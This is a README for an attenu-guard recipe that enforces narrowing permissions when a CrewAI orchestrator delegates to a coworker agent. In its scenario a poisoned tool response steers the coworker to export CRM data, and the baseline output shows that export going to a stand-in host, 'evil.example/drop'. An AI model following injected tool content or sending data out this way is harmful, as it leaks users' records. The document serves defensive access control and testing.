# Authority that narrows across a delegation

A recipe: a CrewAI orchestrator delegates a summarization job to a coworker
agent, the coworker gets a Guard that is strictly narrower than the
orchestrator's, and a poisoned tool call the coworker was never delegated is
denied before its body runs — with a kill switch that revokes the coworker's
whole subtree on that first strike, and a signed, offline-verifiable evidence
bundle at the end.

Tested against **crewai 1.15.16** (Python 3.12; CrewAI needs >=3.10,
attenu-guard supports 3.9+).

## What this recipe teaches

- **Task-scoped delegation.** The orchestrator holds broad authority
  (`crm.*`, `mail.send`); the moment it delegates to a coworker via CrewAI's
  own `Delegate work to coworker` tool, the bridge mints that coworker's
  Guard right there, from an authority set the orchestrator's own code
  declares — not from whatever the model asked for.
- **Monotonic narrowing.** A coworker's authority is checked to be strictly
  narrower than its parent's, and a caller that asks for MORE than its
  parent holds (`payments.transfer`, a 10,000,000-row ceiling) gets back
  exactly what its parent had — never more, however greedy the request.
- **Fail closed before the tool body runs.** An out-of-scope, over-ceiling
  export attempt is denied at CrewAI's `before_tool_call` hook, before
  `crm_export`'s own body ever executes — proven by a side-effect log the
  tool would otherwise have appended to.
- **A kill switch.** One denial trips `revoke_on_deny=True`: the coworker's
  entire subtree is revoked, so its NEXT call — a read that was legal a
  moment earlier — is denied too.
- **Execution-binding evidence.** With `strict_single_hook=True` (see [Trust
  boundary](#trust-boundary) for exactly what that attests), the allowed
  `crm_query` call's ledger entry carries a real `authorized_params_hash`
  that matches what CrewAI's own post-hook observed — not just "was this
  authorized," but "did what actually ran match what was authorized."
- **Offline-verifiable evidence.** The audit log is exported as a signed
  bundle and checked back with the packaged `attenu-guard verify` command —
  a reviewer, or a regulator, needs only the public key, never this process
  or this repository.

## What it hooks

| # | Moment | CrewAI API (site-packages paths) |
|---|--------|----------------------------------|
| 1 | **Child creation** | The `Delegate work to coworker` / `Ask question to coworker` tool call (`crewai/tools/agent_tools/delegate_work_tool.py`, injected at `crewai/crew.py:1746`). The bridge mints the coworker's Guard with `parent.delegate(...)` before `BaseAgentTool._execute` runs the coworker (`crewai/tools/agent_tools/base_agent_tools.py:110-120`). |
| 2 | **Tool invocation** | `crewai.hooks.register_before_tool_call_hook` (`crewai/hooks/tool_hooks.py:208`), dispatched at `InterceptionPoint.PRE_TOOL_CALL` on every path — `crewai/utilities/tool_utils.py:123` (ReAct), `crewai/agents/crew_agent_executor.py:962` (native function calling) — always before the tool body. |

Denials become `crewai.hooks.HookAborted`, **not** `AuthorityDenied`: CrewAI's
dispatcher swallows every other exception fail-open
(`crewai/hooks/dispatch.py:264`), so a raised `AuthorityDenied` would be
silently ignored and the tool would run. A paired `after_tool_call` hook
replaces CrewAI's generic "Tool execution blocked by hook." with the
attenu-guard reason, so the model learns *why* and can adapt.

Everything fails closed: unknown agent, unknown tool, unconfigured coworker,
and any internal bridge error all deny.

## Prerequisites

- Python 3.10+ (crewai's own floor; attenu-guard itself supports 3.9+)
- `crewai==1.15.16` (`pip install crewai==1.15.16`)
- No LLM API key for the offline run below — the crew is driven by a
  scripted `BaseLLM` subclass, no network call is made
- `cryptography` for the evidence-bundle step (`Ed25519Signer`) — already a
  transitive dependency of `crewai` at this pin; if you're wiring this into
  your own app, declare it explicitly via attenu-guard's own `crypto` extra
- A real application consuming attenu-guard from PyPI would pin
  `attenu-guard>=0.10,<0.11`; this recipe lives inside the attenu-guard repo
  itself and imports `src/` directly, so there is nothing to pin here

## Setup

From a checkout of this repository:

```bash
pip install -e .
pip install crewai==1.15.16
```

## Run

```bash
python examples/integrations/crewai/demo.py                     # offline, no API key
python -m pytest -q tests/integrations/test_crewai.py \
                    tests/integrations/test_crewai_conformance.py \
                    tests/integrations/test_crewai_recipe_demo.py  # 47 tests, offline
RUN_LIVE=1 OPENAI_API_KEY=... python examples/integrations/crewai/live_smoke.py
```

## Expected output

Abridged; the run prints the full transcript, including the delegation
graph and the raw audit-log lines between sections 4 and 5.

```text
1. The authority the orchestrator holds
  orchestrator  Authority(scopes=['crm.*', 'mail.send'], ...)
  will delegate Authority(scopes=['crm.read'], ...)

2. What a greedy delegation request gets (met down, never up)
  requested  Authority(scopes=['crm.*', 'mail.send', 'payments.transfer'], ...)
  granted    Authority(scopes=['crm.*', 'mail.send'], ...)
  narrower than parent? True
  'payments.transfer' granted? False

3. Running the crew WITH the bridge installed
      [TOOL BODY RAN] crm_query(rows=4200)

  tool bodies that actually executed:
    RAN     crm_query(rows=4200)

  refusals:
    DENIED  summarizer/crm_export: denied: scope_not_granted ...
    DENIED  summarizer/crm_query: denied: revoked: node has been revoked

4. Delegation graph
    (chain printed here)

5. The ledger, checked without this process
    (raw audit-log lines printed here)

  10 events, hash chain: True

  bundle: (fresh temp dir)/evidence-bundle.json
  verifying it with the packaged command:
    attenu-guard verify evidence-bundle.json --pubkey ...
integrity=True monotonicity=True containment=True anchor=verified nodes=3 actions_checked=1
OK
  reviewer view: 3 nodes

6. BASELINE: the same crew, bridge uninstalled
      [TOOL BODY RAN] crm_query(rows=4200)
      [TOOL BODY RAN] crm_export -> https://evil.example/drop   <-- EXFILTRATION
      [TOOL BODY RAN] crm_query(rows=10)

  CRM exported to an external URL without the bridge? True
  CrewAI itself carries no authority across a delegation: the coworker
  runs its own full tool list (base_agent_tools.py:110-120).

RESULT: OK
```

The bundle path and the pubkey are different on every run (a fresh temp
directory and a fresh Ed25519 keypair each time); everything else is
deterministic. On a machine that has never run CrewAI before, CrewAI's own
first-run tracing-consent flow would otherwise print a one-time "Tracing
Preference Saved" panel before section 1 — `demo.py` sets
`CREWAI_TESTING=true` (CrewAI's own documented escape hatch) specifically so
this offline recipe is deterministic across machines; it is not something
to carry into a real application.

`crm_export` is absent from the list of tool bodies that ran in section 3.

## Trust boundary

The adversary this addresses is the agent itself — a coworker steered by a
poisoned tool response, a confused plan, or a bad task description into
asking for something outside its remit. The enforcement point runs
in-process, at CrewAI's own hook dispatch, and holds:

- as long as the bridge is installed (`with bridge:` in this recipe, or an
  equivalent context-manager scope in your own app). CrewAI's dispatcher
  swallows a raised `AuthorityDenied` fail-open (`hooks/dispatch.py:264`),
  which is exactly why this bridge translates every denial into
  `HookAborted` instead — the one exception CrewAI's own dispatch treats as
  a real abort.
- for anything routed through CrewAI's tool-call hooks. Code that reaches a
  side effect without going through a tool call is outside the checked path.
- against permissions, not against content. The library takes no view on
  whether the export is a good idea; it holds the summarizer to what it was
  delegated.
- **`strict_single_hook=True`, used in this recipe, is an OPT-IN
  attestation, not the adapter's honest default.** CrewAI's
  `before_tool_call`/`after_tool_call` hooks are GLOBAL — the bridge has no
  way to prove it is the only thing registered on them. This recipe can
  make the attestation because it builds the crew and installs the bridge
  itself, with nothing else attached to those hooks; that is what earns the
  `Capture.FRAMEWORK_POST_HOOK` execution binding this README's "What this
  recipe teaches" section shows. **Do not copy `strict_single_hook=True`
  into an application that might load other CrewAI plugins on the same
  global hook** — the honest default, `strict_single_hook=False`
  (`Capture.PRE_HOOK_ONLY`), makes no claim about what happens after
  `check()` returns, and is the safe starting point there. See
  `attenu_guard/adapters/crewai.py`'s own module docstring, "TWO modes,"
  for the full reasoning.

It does not defend against an attacker with code execution in the same
process, who can edit the tool policies and delegation authorities in this
recipe's own `demo.py` before they are loaded. Exported evidence is verified
against a public key, so a bundle altered after export fails verification
with the key alone.

Writing the tool policies and delegation authorities is your job,
deliberately: they are declared inline in `demo.py`'s `main()`, a short,
reviewable block, and the bridge enforces exactly what it says.

## Files

| Path | What it holds |
|---|---|
| `demo.py` | The scripted-model run: the crew, the tool policies, the evidence export, the offline verification |
| `live_smoke.py` | Env-gated: the same scenario against a real model (`RUN_LIVE=1`, costs money, not run by CI) |
| `../../../src/attenu_guard/adapters/crewai.py` | The shipped bridge (`attenu_guard.adapters.crewai`) this recipe drives |
| `../../../tests/integrations/test_crewai.py`, `test_crewai_conformance.py` | The adapter's own conformance suite (generic scenarios, not specific to this recipe) |
| `../../../tests/integrations/test_crewai_recipe_demo.py` | Runnability plus the enforcement assertions for THIS recipe specifically — asserts `demo.main()` itself returns 0 |

Versions this was checked against: `crewai` 1.15.16, `attenu-guard` 0.10.0,
Python 3.12.

## License

This recipe is part of attenu-guard, licensed under the Apache License 2.0 —
see the repository's [`LICENSE`](../../../LICENSE) file for details.
